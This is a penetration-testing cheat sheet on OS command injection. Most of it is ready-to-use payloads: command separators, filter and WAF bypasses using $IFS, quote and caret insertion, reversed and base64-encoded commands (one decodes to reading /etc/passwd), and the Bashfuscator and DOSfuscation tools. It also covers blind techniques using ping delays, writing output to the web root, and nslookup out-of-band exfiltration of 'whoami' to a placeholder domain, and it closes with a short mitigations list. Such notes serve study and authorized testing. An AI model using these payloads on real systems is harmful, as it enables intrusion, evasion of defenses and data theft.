# OS Injection

{% hint style="info" %}
* The user input we control must directly or indirectly go into (or somehow affect) a web query that executes system commands. All web programming languages have different functions that enable the developer to execute operating system commands directly on the back-end server.
* **PHP Functions :** `exec`, `system`, `shell_exec`, `passthru`, or `popen`
* **NodeJS Funtions :** `child_process.exec` or `child_process.spawn`
{% endhint %}

| Semicolon  | `;`    | `%3b`       | Both                                       |
| ---------- | ------ | ----------- | ------------------------------------------ |
| New Line   | `\n`   | `%0a`       | Both                                       |
| Background | `&`    | `%26`       | Both (second output generally shown first) |
| Pipe       | `\|`   | `%7c`       | Both (only second output is shown)         |
| AND        | `&&`   | `%26%26`    | Both (only if first succeeds)              |
| OR         | `\|\|` | `%7c%7c`    | Second (only if first fails)               |
| Sub-Shell  | ` `` ` | `%60%60`    | Both **(Linux-only)**                      |
| Sub-Shell  | `$()`  | `%24%28%29` | Both **(Linux-only)**                      |

* **Command separators**: (`&`, `|`, `&&`, `||`, `0x0a` or `\n` or `%0a`) -> works for both windows and UNIX
* **Unix specific Separators** - `;`, `` `injected command` ``, `$(injected command)`
* Might need to close the quotes(", ') for command to execute
* eg: `& echo hello &`, `& ping -c 10 127.0.0.1` (blind)
* Useful commands - `whoami`, `uname -a`, `ifconfig`, `netstat -an`, `ps -ef` (linux), `ipconfig /all`, `tasklist` (windows)

### OS Command Injection <sub>(simple case)</sub>

* Check whether any input parameters execute OS commands
* eg: `& echo helloworld &`

### Bypass Filters

* #### Identifying Filters
  * **Filter/WAF Detection** - Try the usual operators we tested, like (`;`, `&&`, `||`). If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF
  * **Blacklisted Characters** - Identify characters that are blocked.
* #### Bypass Blacklisted Operators <a href="#bypass-blacklisted-operators" id="bypass-blacklisted-operators"></a>
  * Fuzz for the accepted operator initial befere appending a command.
* #### Bypass Blacklisted Spaces <a href="#bypass-blacklisted-spaces" id="bypass-blacklisted-spaces"></a>
  * Use Tabs - `%09`
  * Using $IFS - `${IFS}` <sup><sub>(default value is a space and a tab in Linux)<sub></sup>
  * Using Brace Expansion - eg: `127.0.0.1%0a`**`{ls,-la}`**
  * [PayloadsAllTheThings-bypasswithoutspace](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)
* #### Bypassing slash (`/`) or backslash (`\`)
  * **Linux** <sup><sub>(<sub></sup><sup><sub>`echo`<sub></sup> <sup><sub>not required)<sub></sup>
    * Use env variables like `${IFS}`
    * `/` or `\` characters may be used in an environment variable, and we can specify `start` and `length` of our string to exactly match this character.
    * eg: `echo ${PATH:0:1}` , `echo ${LS_COLORS:10:1}`. We can do the same with the `$HOME` or `$PWD` environment variables as well.
    * **Payload** : `127.0.0.1${LS_COLORS:10:1}${IFS}`
  * **Windows** <sup><sub>(<sub></sup><sup><sub>`echo`<sub></sup> <sup><sub>not required)<sub></sup>
    * To produce a slash in `Windows Command Line (CMD)`, we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\student`), and then specify a starting position (`~6` -> `\student`)
    * eg: ` echo`` `` `**`%HOMEPATH:~6,-11%`** , `$env:HOMEPATH[0]` , `$env:PROGRAMFILES[10]`
  * #### Character Shifting <sup><sub>(<sub></sup><sup><sub>`echo`<sub></sup> <sup><sub>not required)<sub></sup>
    * `man ascii` <sup><sub>(\ is on 92, before it is \[ on 91)<sub></sup> -> ` echo`` `` `**`$(tr '!-}' '"-~'<<<[)`**

### Bypassing Blacklisted Commands <a href="#bypassing-blacklisted-commands" id="bypassing-blacklisted-commands"></a>

* **Linux & Windows**
  * Inserting certain characters within our command that are usually ignored by command shells like `Bash` or `PowerShell` and will execute the same command.
  * eg: `'` , `"`
  * **Payload**: `w'h'o'am'i` , `w"h"o"am"i`
  * **Note**: We cannot mix types of quotes and the number of quotes must be even.
* **Linux Only**
  * Insert Linux-only characters in the middle of commands, and the bash shell would ignore them and execute the command.
  * Characters include the backslash `\` and the positional parameter character `$@`
  * **Payloads**: `who$@ami`, `w\ho\am\i`
* **Windows Only**
  * Insert Windows-only characters in the middle of commands that do not affect the outcome, like a caret (`^`) character.
  * **Payloads**: `who^ami`
* #### **Case Manipulation**
  * Invert the character cases of a command (e.g. `WHOAMI`) or alternating between cases (e.g. `WhOaMi`)
  * Windows OS is case-insensitive, but Linux is case-senstive.
  * `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` , `$(a="WhOaMi";printf %s "${a,,}")` <sup><sub>(for lInux to convert the string to lowercase)<sub></sup>
* #### **Reversed Commands**
  * Reversing commands and having a command template that switches them back and executes them in real-time.
  * If you wanted to bypass a character filter with the above method, you'd have to reverse them as well, or include them when reversing the original command.
  * Linux - `$(rev<<<'imaohw')`
  * Windows - `iex "$('imaohw'[-1..-20] -join '')"`
* #### **Encoded Commands**
  * We can utilize various encoding tools, like `base64` (for b64 encoding) or `xxd` (for hex encoding)
  * Encode the payload we want to execute (which includes filtered characters)
    * `echo -n 'cat /etc/passwd | grep 33' | base64`
    * `echo -n whoami | iconv -f utf-8 -t utf-16le | base64`
    * `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`
  * **Payload** :
    * `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`
    * `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`
  * Use other alternatives like `sh` for command execution and `openssl` for b64 decoding, or `xxd` for hex decoding
  * [PayloadsAllTheThings-bypasswithvariableexpansion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)

### Evasion Tools

* **Linux**
  * [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator) - `./bashfuscator -c 'cat /etc/passwd'` , `./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1`
* **Windows**
  * [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) - `Import-Module .\Invoke-DOSfuscation.psd1` -> `Invoke-DOSfuscation`

### Blind OS Command Injection with Time Delays

* `& ping -c 10 127.0.0.1 &` (try using different separators) <sup><sub>(Linux)<sub></sup>
* `& ping -n 10 127.0.0.1 &` <sup><sub>(Windows - uses<sub></sup> <sup><sub> </sup><sup><sub>`-n`<sub></sup> <sup><sub> </sup><sup><sub>instead of<sub></sup> <sup><sub> </sup><sup><sub>`-c`<sub></sup><sup><sub>)<sub></sup>
* `& timeout /t 10 &` <sup><sub>(Windows alternative - direct sleep, no ICMP needed)<sub></sup>
* Triggers a time delay to send 10 ICMP packets

### Blind OS Command Injection with Output Redirection

* Output the contents of a command to a text file that can be viewed in the browser
* Need to try in different folders that has write privilege
* eg: `& whoami > var/www/html/whoami.txt &`

### Blind OS Command Injection with Out-of-Band Interaction

* Make use of burp collaborator to initiate a `nslookup`
* eg: `& nslookup domain.com &`, `& nslookup whoami.domain.com &`

### Mitigations

* Avoid using functions that execute system commands. Use built-in functions that perform the needed functionality
* Input Validation
* Input Sanitization
* Use the web server's built-in Web Application Firewall (e.g., in Apache `mod_security`), in addition to an external WAF (e.g. `Cloudflare`, `Fortinet`, `Imperva`..)
* Abide by the [Principle of Least Privilege (PoLP)](https://en.wikipedia.org/wiki/Principle_of_least_privilege) by running the web server as a low privileged user (e.g. `www-data`)
* Prevent certain functions from being executed by the web server (e.g., in PHP `disable_functions=system,...`)
* Limit the scope accessible by the web application to its folder (e.g. in PHP `open_basedir = '/var/www/html'`)
* Reject double-encoded requests and non-ASCII characters in URLs
* Avoid the use of sensitive/outdated libraries and modules (e.g. [PHP CGI](https://www.php.net/manual/en/install.unix.commandline.php))
